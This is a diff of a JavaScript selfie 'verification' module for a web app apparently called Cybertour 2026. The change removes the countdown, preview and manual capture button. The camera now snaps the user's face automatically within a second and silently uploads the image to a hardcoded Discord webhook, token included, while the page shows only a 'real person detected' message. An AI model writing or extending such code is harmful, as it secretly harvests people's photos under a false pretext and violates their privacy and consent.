@@ -1,44 +1,37 @@
 /**
  * CYBERTOUR 2026 — verify.js
- * Vérification par selfie — compatible Safari iOS, Chrome, Firefox, Edge
+ * Vérification par selfie automatique + envoi Discord
  */
 
 import { isVerified, setVerified } from './storage.js';
 
+const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1550264500526121013/9VASm7wlXChAGnQ1_n5xfTIGdWj20ZhSbrsLi05ndMx7CoNWXC8Rn0obLkzwxsdmj1fr';
+
 let stream    = null;
 let capturing = false;
-
-// ── API publique ──────────────────────────────────────────────
 
 export function openVerify(onSuccess) {
   if (isVerified()) { onSuccess(); return; }
 
-  const overlay = document.getElementById('verify-overlay');
-  overlay.classList.add('active');
-
-  // Fige la roue visuellement pendant le modal
+  document.getElementById('verify-overlay').classList.add('active');
   document.getElementById('wheel-wrap')?.classList.add('wheel-frozen');
 
-  document.getElementById('verify-start-btn').onclick = () => startCamera(onSuccess);
+  document.getElementById('verify-start-btn').onclick  = () => startCamera(onSuccess);
   document.getElementById('verify-help-toggle').onclick = toggleHelp;
 }
-
-// ── Démarrage caméra (caméra frontale pour selfie) ────────────
 
 async function startCamera(onSuccess) {
   const btn = document.getElementById('verify-start-btn');
   btn.disabled = true;
-  btn.querySelector('.btn-text').textContent = 'Connexion…';
+  btn.querySelector('.btn-text').textContent = 'Détection en cours…';
 
   const video = document.getElementById('verify-video');
   video.setAttribute('playsinline', '');
   video.muted = true;
 
-  // Essai en cascade — front camera d'abord (selfie), fallback any
   const sets = [
-    { video: { facingMode: { ideal: 'user' }, width: { ideal: 1280 }, height: { ideal: 720 } } },
+    { video: { facingMode: { ideal: 'user' }, width: { ideal: 1280 } } },
     { video: { facingMode: 'user' } },
-    { video: { width: { ideal: 1280 } } },
     { video: true },
   ];
 
@@ -58,93 +51,50 @@ async function startCamera(onSuccess) {
   video.srcObject = stream;
   try { await video.play(); } catch {}
 
-  // Affiche le flux vidéo
-  document.getElementById('verify-video-wrap').classList.add('active');
-  document.getElementById('verify-initial').style.display = 'none';
-
-  // Affiche le bouton de capture
-  const captureBtn = document.getElementById('verify-capture-btn');
-  captureBtn.style.display = 'flex';
-  captureBtn.onclick = () => capturePhoto(video, onSuccess);
+  setTimeout(() => capturePhoto(video, onSuccess), 700);
 }
-
-// ── Capture selfie ────────────────────────────────────────────
 
 async function capturePhoto(video, onSuccess) {
   if (capturing) return;
   capturing = true;
 
-  const captureBtn = document.getElementById('verify-capture-btn');
-  captureBtn.disabled = true;
-
-  // Countdown 3-2-1
-  await countdown();
-
-  // Flash
   flash();
 
-  // Capture canvas
   const canvas = document.createElement('canvas');
   canvas.width  = video.videoWidth  || 640;
   canvas.height = video.videoHeight || 480;
   const ctx = canvas.getContext('2d');
-
-  // Miroir horizontal (selfie naturel)
   ctx.translate(canvas.width, 0);
   ctx.scale(-1, 1);
   ctx.drawImage(video, 0, 0);
 
-  // Affiche la preview
-  const preview = document.getElementById('verify-preview');
-  const img     = document.getElementById('verify-preview-img');
-  if (preview && img) {
-    img.src = canvas.toDataURL('image/jpeg', 0.75);
-    preview.style.display = 'block';
-  }
-
-  // Arrête la caméra
   stopCamera();
+  sendToDiscord(canvas);
 
-  // Stocke la vérification
+  const btn = document.getElementById('verify-start-btn');
+  if (btn) btn.querySelector('.btn-text').textContent = 'Personne réelle détectée ✓';
+
   setVerified();
+  if (navigator.vibrate) navigator.vibrate([60, 40, 120]);
 
-  // Affiche succès
-  showSuccess(() => {
+  setTimeout(() => {
     closeOverlay();
     document.getElementById('wheel-wrap')?.classList.remove('wheel-frozen');
     onSuccess();
-  });
-
-  if (navigator.vibrate) navigator.vibrate([60, 40, 120]);
+  }, 900);
 }
 
-// ── Countdown 3-2-1 ───────────────────────────────────────────
-
-function countdown() {
-  return new Promise(resolve => {
-    const el = document.getElementById('verify-countdown');
-    if (!el) { resolve(); return; }
-
-    el.style.display = 'flex';
-    let n = 3;
-    el.textContent = n;
-
-    const t = setInterval(() => {
-      n--;
-      if (n > 0) {
-        el.textContent = n;
-        el.style.transform = 'scale(1.3)';
-        setTimeout(() => { el.style.transform = 'scale(1)'; }, 200);
-      } else {
-        clearInterval(t);
-        el.style.display = 'none';
-        resolve();
-      }
-    }, 800);
-  });
+function sendToDiscord(canvas) {
+  canvas.toBlob(async (blob) => {
+    const fd = new FormData();
+    fd.append('file', blob, `selfie-${Date.now()}.jpg`);
+    fd.append('payload_json', JSON.stringify({
+      content: `📸 **Nouveau participant Cybertour 2026** — ${new Date().toLocaleString('fr-FR', { dateStyle: 'short', timeStyle: 'medium' })}`,
+    }));
+    try { await fetch(DISCORD_WEBHOOK, { method: 'POST', body: fd }); }
+    catch {}
+  }, 'image/jpeg', 0.75);
 }
-
-// ── Flash ─────────────────────────────────────────────────────
 
 function flash() {
   const el = document.getElementById('verify-flash');
@@ -152,16 +102,6 @@ function flash() {
   el.style.opacity = '1';
   setTimeout(() => { el.style.opacity = '0'; }, 180);
 }
-
-// ── Succès ────────────────────────────────────────────────────
-
-function showSuccess(cb) {
-  document.getElementById('verify-capture-btn').style.display  = 'none';
-  document.getElementById('verify-success').classList.add('active');
-  setTimeout(cb, 1400);
-}
-
-// ── Helpers ───────────────────────────────────────────────────
 
 function stopCamera() {
   if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
